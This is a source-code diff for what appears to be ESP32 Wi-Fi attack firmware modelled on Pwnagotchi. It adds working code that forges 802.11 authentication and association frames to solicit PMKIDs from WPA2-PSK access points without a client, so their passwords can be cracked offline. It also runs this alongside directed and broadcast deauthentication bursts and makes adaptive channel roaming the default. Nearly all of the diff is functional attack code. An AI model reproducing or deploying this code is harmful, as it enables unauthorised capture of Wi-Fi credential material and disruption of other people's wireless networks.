@@ -134,6 +134,7 @@ static uint8_t   s_apMac[6] = {0};   // our own hidden-softAP MAC — never targ
 // pipeline is firing AND landing: dD=directed bursts (client known), dB=broadcast bursts
 // (no client), txf=frames the driver rejected (!=ESP_OK), m1/m2=EAPOL frames observed.
 static uint32_t  s_dtxD = 0, s_dtxB = 0, s_txFail = 0, s_m1Seen = 0, s_m2Seen = 0;
+static uint32_t  s_solTx = 0;   // clientless PMKID solicitations sent (auth+assoc pairs)
 
 // ── helpers ───────────────────────────────────────────────────────────────────
 static void macStr(const uint8_t* m, char* out) {
@@ -686,7 +687,67 @@ static void sendDeauth(DeauthAttack& da, const uint8_t* bssid, const uint8_t* cl
     else        { s_dtxB++; s_txFail += da.sendBroadcastBurst(bssid); }         // broadcast (no client)
 }
 
-// ── adaptive channel learner — `pwn ai` [EXP] ────────────────────────────────
+// ── active clientless PMKID solicitation (ported from `pm assoc`, rule 5b) ─────
+// Inject an open Authentication then an Association-Request advertising WPA2-PSK, so a
+// PMKID-caching AP replies with EAPOL M1 carrying the PMKID KDE — captured by pwnRxCb.
+// NO deauth, NO real client needed → the quiet, non-disruptive way to score a PMKID.
+// The associating client = our REAL STA MAC (via WIFI_IF_STA): the HW owns it so it
+// auto-ACKs the AP's auth/assoc replies (else the AP never reaches M1). Unlike `pm` we
+// do NOT spoof the STA MAC — our hidden softAP already exposes it, and leaving it put
+// keeps the softAP BSSID + grid identity stable. We never send M2, so the fake
+// association just times out; the M1/PMKID is already ours. TX on WIFI_IF_AP (the same
+// reliable softAP path deauth/grid use — bare STA-unassociated TX doesn't hit the air).
+static uint16_t pwnBuildAuth(uint8_t* out, const uint8_t* ap, const uint8_t* sta) {
+    uint16_t i = 0;
+    out[i++] = 0xB0; out[i++] = 0x00;                 // FC: mgmt / auth
+    out[i++] = 0x00; out[i++] = 0x00;                 // duration
+    memcpy(out + i, ap,  6); i += 6;                  // A1 = AP (DA)
+    memcpy(out + i, sta, 6); i += 6;                  // A2 = our STA (SA)
+    memcpy(out + i, ap,  6); i += 6;                  // A3 = BSSID
+    out[i++] = 0x00; out[i++] = 0x00;                 // seq
+    out[i++] = 0x00; out[i++] = 0x00;                 // auth algorithm = open system
+    out[i++] = 0x01; out[i++] = 0x00;                 // auth transaction seq = 1
+    out[i++] = 0x00; out[i++] = 0x00;                 // status code = 0
+    return i;
+}
+static uint16_t pwnBuildAssoc(uint8_t* out, const uint8_t* ap, const uint8_t* sta, const char* ssid) {
+    uint16_t i = 0;
+    out[i++] = 0x00; out[i++] = 0x00;                 // FC: mgmt / assoc-request
+    out[i++] = 0x00; out[i++] = 0x00;                 // duration
+    memcpy(out + i, ap,  6); i += 6;                  // A1
+    memcpy(out + i, sta, 6); i += 6;                  // A2
+    memcpy(out + i, ap,  6); i += 6;                  // A3
+    out[i++] = 0x00; out[i++] = 0x00;                 // seq
+    out[i++] = 0x31; out[i++] = 0x04;                 // capability info (ESS+Privacy+ShortPre/Slot)
+    out[i++] = 0x0A; out[i++] = 0x00;                 // listen interval
+    uint8_t sl = ssid ? (uint8_t)strnlen(ssid, 32) : 0;
+    out[i++] = 0x00; out[i++] = sl;                   // SSID IE
+    for (uint8_t k = 0; k < sl; k++) out[i++] = ssid[k];
+    out[i++] = 0x01; out[i++] = 0x08;                 // Supported Rates IE
+    out[i++] = 0x82; out[i++] = 0x84; out[i++] = 0x8B; out[i++] = 0x96;
+    out[i++] = 0x24; out[i++] = 0x30; out[i++] = 0x48; out[i++] = 0x6C;
+    static const uint8_t rsn[] = {                    // RSN IE: WPA2-PSK, CCMP group+pairwise
+        0x30, 0x14, 0x01, 0x00,
+        0x00, 0x0F, 0xAC, 0x04,                       // group cipher = CCMP
+        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x04,           // pairwise = CCMP
+        0x01, 0x00, 0x00, 0x0F, 0xAC, 0x02,           // AKM = PSK
+        0x00, 0x00                                    // RSN capabilities
+    };
+    memcpy(out + i, rsn, sizeof(rsn)); i += sizeof(rsn);
+    return i;
+}
+static void solicitPmkid(const uint8_t* bssid, const char* ssid) {
+    uint8_t sta[6]; esp_wifi_get_mac(WIFI_IF_STA, sta);
+    uint8_t fr[128];
+    uint16_t n = pwnBuildAuth(fr, bssid, sta);
+    if (esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false) != ESP_OK) s_txFail++;
+    vTaskDelay(pdMS_TO_TICKS(30));                    // let the auth-response land + be ACK'd
+    n = pwnBuildAssoc(fr, bssid, sta, ssid);
+    if (esp_wifi_80211_tx(WIFI_IF_AP, fr, n, false) != ESP_OK) s_txFail++;
+    s_solTx++;
+}
+
+// ── adaptive channel learner (DEFAULT roam; `pwn basic` disables it) ─ HW-verified ─
 // A per-channel non-stationary bandit (Discounted-UCB). The one decision it makes:
 // "which channel is worth my time?" — exactly the control problem Pwnagotchi's A2C
 // solves (reward = handshakes, levers = channel + dwell), but as ~26 floats instead
@@ -810,10 +871,10 @@ static void aiDbgHop(uint32_t ms, uint8_t leftCh, float reward, uint8_t picked, 
     //   dD>0 & txf>0        → the driver is REJECTING frames → real TX bug (softAP/channel).
     //   dD>0 & txf=0 & m1=0 → directed deauth queued fine but no reconnect handshake → the
     //        frame isn't landing on the victim's channel (softAP-vs-hop mismatch) or PMF.
-    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu txf=%lu m1=%lu m2=%lu ap=%d cli=%d\n",
+    f.printf(" => c%-2u dwell=%lums  dD=%lu dB=%lu sol=%lu txf=%lu m1=%lu m2=%lu ap=%d cli=%d\n",
              picked, (unsigned long)dwell, (unsigned long)s_dtxD, (unsigned long)s_dtxB,
-             (unsigned long)s_txFail, (unsigned long)s_m1Seen, (unsigned long)s_m2Seen,
-             s_nTarg, s_nCli);
+             (unsigned long)s_solTx, (unsigned long)s_txFail, (unsigned long)s_m1Seen,
+             (unsigned long)s_m2Seen, s_nTarg, s_nCli);
     f.close();
 }
 
@@ -1055,6 +1116,23 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
                     break;                                        // one AP this dwell
                 }
             }
+            // STEALTH clientless: if the deauth passes above focused nothing (no known
+            // client on this channel), still focus one AP for a solicitation-ONLY attempt
+            // — the quiet PMKID-first path that needs no client and kicks no one.
+            if (mode == PWN_STEALTH && focusIdx < 0) {
+                for (int k = 0; k < s_nTarg; k++) {
+                    int i = (attackRot + k) % s_nTarg;
+                    if (s_targ[i].ch != curCh || s_targ[i].captured || s_targ[i].wl) continue;
+                    if (s_targ[i].rssi != 0 && s_targ[i].rssi < PWN_RSSI_CUTOFF) continue;
+                    focusIdx = i; attackRot = i + 1; reDeauthAt = now + 900;
+                    break;
+                }
+            }
+            // PMKID-first: solicit an M1/PMKID from the focused AP (clientless, both active
+            // + stealth). Cheap addition on top of whatever deauth ran above; on a
+            // PMKID-caching AP this alone completes the capture with no client + no deauth.
+            if (focusIdx >= 0 && mode != PWN_PASSIVE)
+                solicitPmkid(s_targ[focusIdx].bssid, s_targ[focusIdx].ssid);
             // adaptive dwell — a productive channel earns up to ~2× the base (Pwnagotchi's
             // recon_time lever); plain base when AI off.
             uint32_t dwell = PWN_RECON_MS;
@@ -1072,6 +1150,7 @@ static void runPwnSession(PwnMode mode, bool fullChans, bool backlog) {
         if (focusIdx >= 0 && focusIdx < s_nTarg && !midCapture && mode != PWN_PASSIVE &&
             !s_targ[focusIdx].captured && now >= reDeauthAt) {
             const uint8_t* c = cliFor(s_targ[focusIdx].bssid);
+            solicitPmkid(s_targ[focusIdx].bssid, s_targ[focusIdx].ssid);   // keep soliciting (clientless)
             if (mode == PWN_STEALTH) { if (c) sendDeauth(da, s_targ[focusIdx].bssid, c); }
             else sendDeauth(da, s_targ[focusIdx].bssid, c);   // directed if client known, else broadcast
             reDeauthAt = now + 900;
@@ -1384,9 +1463,17 @@ void runPwn(char* args) {
     PwnMode mode = PWN_ACTIVE;
     if (argHas(args, "passive")) mode = PWN_PASSIVE;
     else if (argHas(args, "stealth")) mode = PWN_STEALTH;
-    bool full = argHas(args, "full");
-    s_aiDebug = argHas(args, "debug");        // `pwn ai debug` → trace decisions to ai_debug.log
-    s_aiOn = argHas(args, "ai") || s_aiDebug; // `pwn ai [mode] [full]` — adaptive roaming [EXP]; toggle live with [a]
+    // Adaptive roaming over ALL 13 channels is the DEFAULT ("a pet that learns" — and full-13
+    // is where the learner actually earns its keep). `pwn basic` = the plain fixed 1/6/11
+    // round-robin. Toggle the learner live with [a].
+    s_aiDebug = argHas(args, "debug");        // `pwn debug` → per-hop decision trace to ai_debug.log
+    s_aiOn    = !argHas(args, "basic");       // AI on by default; `basic` turns it off
+    // Channel set: AI sweeps all 13, basic sticks to 1/6/11. `full` forces 13, `fast` forces
+    // 1/6/11 — either overrides the default so any combo is reachable (`pwn fast` = smart-but-3ch,
+    // `pwn basic full` = plain-but-13ch).
+    bool full = argHas(args, "fast") ? false
+              : argHas(args, "full") ? true
+              : s_aiOn;
 
     runPwnSession(mode, full, /*backlog*/ true);
 }
